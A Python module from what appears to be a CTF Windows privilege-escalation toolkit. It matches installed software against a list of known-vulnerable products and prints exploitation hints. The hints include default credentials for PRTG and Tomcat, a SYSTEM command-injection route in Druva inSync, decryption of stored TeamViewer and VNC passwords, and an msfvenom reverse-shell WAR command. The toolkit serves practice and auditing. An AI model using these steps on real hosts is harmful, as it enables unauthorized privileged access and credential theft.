"""
CTFKit - Windows PrivEsc
Software Analyzer
"""

import re

from rich.console import Group
from rich.table import Table
from rich.text import Text


SECTION = "SOFTWARE"


# ==========================================
# KNOWLEDGE BASE
# ==========================================

#
# Curated, not exhaustive — third-party CVEs are added here as they're
# encountered, the same way KERNEL's patch-date table only tracks named
# CVEs instead of trying to maintain a full hotfix->CVE mapping. A
# whitelist ("flag everything not known-safe") isn't viable here: every
# fleet carries a different pile of OEM tools and runtimes, so it would
# either drown in false positives or need an ever-growing safe-list.
#
VULNERABLE_SOFTWARE = [

    {
        "match": re.compile(r"Druva\s*inSync", re.I),
        "max_version": "6.6.3",
        "service": "inSyncCPHService",
        "title": "Druva inSync <= 6.6.3 — inSyncCPH RPC command injection",
        "reason": "The inSyncCPH client service accepts unauthenticated requests on a local TCP port (default 6064) and can be coerced into running an arbitrary command as SYSTEM.",
        "recommendation": [
            "Confirm the listening port: netstat -ano | findstr <PID from Get-Process on inSyncCPHwnet64>",
            "Send a crafted \"inSync PHC RPCW[v0002]\" request to run a command as SYSTEM",
            "Run: ctf privesc.windows.software.druva_insync",
        ],
    },

    {
        "match": re.compile(r"PRTG\s*Network\s*Monitor", re.I),
        "max_version": "18.2.38",
        "service": "PRTGCoreService",
        "title": "PRTG Network Monitor < 18.2.39 — authenticated RCE via Notifications (CVE-2018-9276)",
        "reason": "A low-privilege PRTG web user can create a Notification that executes an arbitrary program, and the PRTG core service typically runs as LocalSystem or a highly privileged service account — this turns into command execution as that account. Needs PRTG web credentials (default admin/PRTGAdmin, or reused/found creds).",
        "recommendation": [
            "Log into the PRTG web UI (default :8080) with admin/PRTGAdmin or any recovered creds",
            "Setup > Account Settings > Notifications > Add new notification > Execute Program, point it at a payload, then trigger it against any sensor",
            "Run: ctf privesc.windows.software.prtg",
        ],
    },

    {
        "match": re.compile(r"TeamViewer", re.I),
        "max_version": None,
        "service": "TeamViewer",
        "title": "TeamViewer — cached connection password in registry",
        "reason": "TeamViewer stores the current/last session's connection password in the registry, obfuscated or AES-encrypted with a key that's publicly known and hardcoded across versions — recoverable offline regardless of which account is running the client.",
        "recommendation": [
            "Check HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer (or HKCU\\SOFTWARE\\TeamViewer on older installs) for SecurityPasswordAES / SecurityPasswordExported",
            "Decrypt with a public TeamViewer password-recovery script — the key is hardcoded and well documented",
            "Only useful if the recovered password grants a more privileged session — verify before relying on it",
            "Run: ctf privesc.windows.software.teamviewer",
        ],
    },

    {
        "match": re.compile(r"UltraVNC", re.I),
        "max_version": None,
        "service": "uvnc_service",
        "title": "UltraVNC — stored password in registry (classic VNC DES scheme)",
        "reason": "UltraVNC can store its server password in the registry encrypted with the classic VNC algorithm, which uses a fixed, publicly known key across the whole VNC family — trivially reversible with any VNC password decryptor.",
        "recommendation": [
            "Check HKLM\\SOFTWARE\\UltraVNC (or the WOW6432Node equivalent on 64-bit) for a stored passwd/passwd2 value",
            "Decrypt with a public VNC password decryptor (e.g. vncpwd) — the key is fixed across the VNC family",
            "Run: ctf privesc.windows.software.vnc",
        ],
    },

    {
        "match": re.compile(r"TightVNC", re.I),
        "max_version": None,
        "service": "tvnserver",
        "title": "TightVNC — stored password in registry (classic VNC DES scheme)",
        "reason": "TightVNC can store its server password in the registry using the same fixed-key VNC scheme as the rest of the VNC family — recoverable with any standard VNC password decryptor.",
        "recommendation": [
            "Check HKLM\\SOFTWARE\\TightVNC\\Server for a stored Password value",
            "Decrypt with a public VNC password decryptor (e.g. vncpwd) — the key is fixed across the VNC family",
            "Run: ctf privesc.windows.software.vnc",
        ],
    },

    {
        "match": re.compile(r"RealVNC", re.I),
        "max_version": None,
        "service": "vncserver",
        "title": "RealVNC — check for a stored/reused server password",
        "reason": "Legacy RealVNC configurations use the same crackable fixed-key VNC scheme as UltraVNC/TightVNC; modern versions use per-install encryption that isn't reliably reversible — worth checking the version before assuming it's crackable, and creds get reused regardless.",
        "recommendation": [
            "Check HKLM\\SOFTWARE\\RealVNC\\WinVNC4 (or vncserver.exe's config) for a stored password value",
            "Confirm the version first — only legacy installs use the crackable fixed-key scheme",
        ],
    },

    {
        "match": re.compile(r"Apache\s*Tomcat", re.I),
        "max_version": None,
        "service": None,
        "title": "Apache Tomcat — check the Manager app for default/weak credentials",
        "reason": "The Tomcat Manager webapp (commonly on :8080/manager) allows deploying a WAR file for code execution, and the Windows Tomcat service is frequently left running as LocalSystem or a highly privileged account — installed-but-never-hardened (default or weak manager creds) is a common finding. No single fixed service name to check automatically — it varies by installed version (Tomcat9, Tomcat10, ...).",
        "recommendation": [
            "Check tomcat-users.xml under the install dir's conf/ for cleartext creds, or try default/weak creds (tomcat:tomcat, admin:admin, tomcat:s3cret) against /manager/html",
            "Deploy a malicious WAR (msfvenom -p java/jsp_shell_reverse_tcp ... -f war) via the manager app for code execution as the service account",
        ],
    },

]

#
# Suppressed from the "unrecognized" catch-all below — OS components and
# common runtimes that show up on virtually every install and aren't
# worth a manual-review nudge every single time. Pure noise control, not
# a safety claim — nothing here can suppress a VULNERABLE_SOFTWARE match.
#
NOISE_PATTERNS = [
    re.compile(r"^Microsoft (Visual C\+\+|Edge|\.NET|Update Health Tools|OneDrive)", re.I),
    re.compile(r"Redistributable", re.I),
    re.compile(r"^Update for Windows", re.I),
    re.compile(r"^KB\d+", re.I),
    re.compile(r"^(Intel|Realtek|NVIDIA|AMD)\b", re.I),
    re.compile(r"^(VMware Tools|VirtualBox Guest Additions)$", re.I),
]


# ==========================================
# HELPERS
# ==========================================

def _get_command_output(section, command):
    #
    # See analyzers/weakperms.py for why the lookahead has no leading
    # \n — genuinely empty command output would otherwise swallow the
    # entire next command's output.
    #
    pattern = rf">>> COMMAND: {re.escape(command)}\n\n(.*?)(?=>>> COMMAND:|\Z)"
    match = re.search(pattern, section, re.S)
    return match.group(1).strip() if match else ""


def _blocks(text):
    return [b for b in re.split(r"\n\s*\n", text.strip()) if b.strip()]


def _fields(block):

    fields = {}

    for line in block.splitlines():

        match = re.match(r"^(\w+)\s*:\s*(.*)$", line.strip())

        if match:
            fields[match.group(1)] = match.group(2).strip()

    return fields


def _parse_programs(text):

    programs = []

    for block in _blocks(text):

        fields = _fields(block)

        if fields.get("DisplayName"):
            programs.append({
                "name": fields["DisplayName"],
                "version": fields.get("DisplayVersion", ""),
            })

    return programs


def _parse_services(text):

    services = {}

    for block in _blocks(text):

        fields = _fields(block)

        if fields.get("Name"):
            services[fields["Name"]] = {
                "state": fields.get("State", ""),
                "startname": fields.get("StartName", ""),
            }

    return services


def _version_tuple(version):
    return tuple(int(n) for n in re.findall(r"\d+", version))


def _version_lte(version, max_version):

    v = _version_tuple(version)
    m = _version_tuple(max_version)

    #
    # Compare only as many components as max_version specifies — a
    # DisplayVersion of "6.6.3.0" against a max of "6.6.3" should still
    # read as <=.
    #
    return v[:len(m)] <= m


def _is_noise(name):
    return any(p.search(name) for p in NOISE_PATTERNS)


# ==========================================
# REPORT
# ==========================================

def _render_report(programs, matched, unrecognized):

    table = Table(box=None, show_header=False, pad_edge=False, padding=(0, 2, 0, 0))
    table.add_column(style="bold cyan")
    table.add_column(style="white")

    table.add_row("Installed Programs", str(len(programs)))
    table.add_row("Known-Vulnerable Matches", str(len(matched)))
    table.add_row("Unrecognized (needs manual review)", str(len(unrecognized)))

    elements = [table]

    if matched:

        elements.append(Text(""))
        elements.append(Text.from_markup("[bold red]Known-vulnerable software[/bold red]"))

        mtable = Table(box=None, show_header=True, header_style="bold cyan", pad_edge=False, padding=(0, 2, 0, 0))
        mtable.add_column("Program")
        mtable.add_column("Version")
        mtable.add_column("Service")
        mtable.add_column("Running")

        for m in matched:
            mtable.add_row(
                m["program"]["name"],
                m["program"]["version"] or "-",
                m["entry"]["service"] or "-",
                "[bold green]Yes[/bold green]" if m["running"] else "[yellow]No / unknown[/yellow]",
            )

        elements.append(mtable)

    if unrecognized:

        elements.append(Text(""))
        elements.append(Text.from_markup("[bold cyan]Unrecognized third-party software (not cross-referenced, review manually)[/bold cyan]"))

        utable = Table(box=None, show_header=False, pad_edge=False, padding=(0, 2, 0, 0))
        utable.add_column(style="white")
        utable.add_column(style="dim")

        for p in unrecognized:
            utable.add_row(p["name"], p["version"] or "-")

        elements.append(utable)

    return Group(*elements)


# ==========================================
# PUBLIC API
# ==========================================

def analyze(section):

    programs = _parse_programs(
        _get_command_output(
            section,
            'Get-ItemProperty "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*","HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*" -ErrorAction SilentlyContinue | Where-Object { $_.DisplayName } | Sort-Object DisplayName | Format-List DisplayName, DisplayVersion'
        )
    )

    services = _parse_services(
        _get_command_output(section, "Get-CimInstance Win32_Service | Select-Object Name, DisplayName, State, StartName | Format-List")
    )

    findings = []
    matched = []
    matched_names = set()

    for entry in VULNERABLE_SOFTWARE:

        for program in programs:

            if not entry["match"].search(program["name"]):
                continue

            #
            # max_version is optional — entries like TeamViewer/VNC's stored-
            # password behavior aren't a single patched CVE with a version
            # cutoff, they apply broadly, so those entries skip the gate
            # entirely rather than needing a fake "always true" ceiling.
            #
            if entry["max_version"] is not None:
                if not program["version"] or not _version_lte(program["version"], entry["max_version"]):
                    continue

            matched_names.add(program["name"])

            #
            # service is optional too — some entries (Tomcat) don't have one
            # fixed Windows service name to check, it varies by install.
            #
            service = services.get(entry["service"]) if entry["service"] else None
            running = service is not None and service["state"] == "Running"

            matched.append({"program": program, "entry": entry, "running": running})

            if running:

                findings.append({
                    "priority": "HIGH",
                    "module": "SOFTWARE",
                    "title": entry["title"],
                    "reason": f'{program["name"]} ({program["version"] or "version unknown"}) is installed and its service ({entry["service"]}) is running as {service["startname"] or "unknown"}. {entry["reason"]}',
                    "recommendation": entry["recommendation"],
                })

            else:

                if not entry["service"]:
                    status = "not automatically checkable — no single fixed service name for this one"
                elif service is None:
                    status = "not present in the enumerated service list"
                else:
                    status = f'currently {service["state"]}'

                findings.append({
                    "priority": "MEDIUM",
                    "module": "SOFTWARE",
                    "title": f'{entry["title"]} (service not confirmed running)' if entry["service"] else entry["title"],
                    "reason": f'{program["name"]} ({program["version"] or "version unknown"}) is installed, matching a known-vulnerable pattern, but its service is {status}. Worth rechecking — it may start later, need to be triggered, or need a manual look.',
                    "recommendation": entry["recommendation"],
                })

    unrecognized = [
        p for p in programs
        if p["name"] not in matched_names and not _is_noise(p["name"])
    ]

    if unrecognized:

        findings.append({
            "priority": "LOW",
            "module": "SOFTWARE",
            "title": f"{len(unrecognized)} unrecognized third-party application(s) installed",
            "reason": "Not cross-referenced against a known-CVE list — worth a manual look, especially anything unusual for a standard build. Full list in the module report below.",
            "recommendation": [
                "Cross-reference name + version against public CVE databases / searchsploit",
                "Look for anything that isn't a stock Windows component or a common runtime",
            ],
        })

    return {

        "module": "SOFTWARE",

        "summary": {

            "Installed Programs": len(programs),
            "Known-Vulnerable Matches": len(matched),
            "Unrecognized": len(unrecognized),

        },

        "findings": findings,

        "report": _render_report(programs, matched, unrecognized),

        "details": {

            "programs": programs,
            "services": services,
            "matched": matched,
            "unrecognized": unrecognized,

        },

    }
